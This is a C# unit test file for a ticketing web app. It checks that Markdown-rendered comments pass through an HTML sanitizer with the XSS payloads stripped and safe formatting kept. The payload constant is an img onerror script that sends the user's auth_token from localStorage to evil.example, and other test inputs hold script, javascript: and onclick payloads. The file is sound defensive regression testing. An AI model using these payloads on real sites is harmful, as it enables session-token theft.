using System.Reflection;
using Markdig;
using THWTicketApp.Web.Components;
using THWTicketApp.Web.Helpers;
using THWTicketApp.Web.Pages;

namespace THWTicketApp.Tests.Components;

/// <summary>
/// Security regression guard for the stored-XSS fixes (issues #191, #195, #198)
/// AND the follow-up display regression (comments are stored as HTML, so we must
/// sanitize rather than escape).
///
/// Comments, notes, issue bodies and report content are attacker-controllable
/// HTML rendered via (MarkupString)SafeHtml.Sanitize(Markdown.ToHtml(...)). The
/// sanitizer must strip dangerous markup (event handlers, script, javascript:)
/// while keeping the safe formatting tags Trudesk actually stores (p, br, a).
/// These tests reach the real production pipelines by reflection and run the
/// exact render+sanitize path each sink uses.
/// </summary>
public class MarkdownXssTests
{
    private const string Payload =
        "<img src=x onerror=\"fetch('https://evil.example/'+localStorage.getItem('auth_token'))\">";

    public static IEnumerable<object[]> Pipelines =>
        new[]
        {
            new object[] { GetPipeline(typeof(TicketActivityFeed), "_md") },
            new object[] { GetPipeline(typeof(Reports), "_mdPipeline") },
            new object[] { GetPipeline(typeof(TicketDetail), "_mdPipeline") },
        };

    // The full production path: Markdown.ToHtml through the real pipeline, then
    // SafeHtml.Sanitize — exactly what every (MarkupString) sink runs.
    [Theory]
    [MemberData(nameof(Pipelines))]
    public void RenderPath_neutralizes_xss_payload(MarkdownPipeline pipeline)
    {
        var html = SafeHtml.Sanitize(Markdown.ToHtml(Payload, pipeline));

        Assert.DoesNotContain("onerror", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("localStorage", html, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [MemberData(nameof(Pipelines))]
    public void RenderPath_keeps_legitimate_markdown(MarkdownPipeline pipeline)
    {
        var html = SafeHtml.Sanitize(Markdown.ToHtml("**bold**", pipeline));
        Assert.Contains("<strong>bold</strong>", html);
    }

    // The core of the display-regression fix: HTML that Trudesk stores in comment
    // bodies (paragraphs, line breaks, mailto links) must survive sanitization.
    [Fact]
    public void Sanitize_preserves_stored_comment_html()
    {
        const string stored =
            "<p>Termin: 02.07.<br>Typenschild an " +
            "<a href=\"mailto:iris@example.de\">iris@example.de</a> geschickt.</p>";

        var html = SafeHtml.Sanitize(stored);

        Assert.Contains("<p>", html);
        Assert.Contains("<br>", html);
        Assert.Contains("mailto:iris@example.de", html);
        Assert.Contains("Typenschild", html);
    }

    [Theory]
    [InlineData("<script>steal()</script>", "steal")]
    [InlineData("<a href=\"javascript:steal()\">x</a>", "javascript:")]
    [InlineData("<div onclick=\"steal()\">x</div>", "onclick")]
    [InlineData("<img src=x onerror=\"steal()\">", "onerror")]
    public void Sanitize_strips_dangerous_markup(string input, string mustNotContain)
    {
        var html = SafeHtml.Sanitize(input);
        Assert.DoesNotContain(mustNotContain, html, StringComparison.OrdinalIgnoreCase);
    }

    private static MarkdownPipeline GetPipeline(Type componentType, string fieldName)
    {
        var field = componentType.GetField(fieldName, BindingFlags.NonPublic | BindingFlags.Static)
            ?? throw new InvalidOperationException(
                $"Expected private static Markdig pipeline field '{fieldName}' on {componentType.Name}. " +
                "If it was renamed, update this XSS regression test accordingly.");
        return (MarkdownPipeline)field.GetValue(null)!;
    }
}
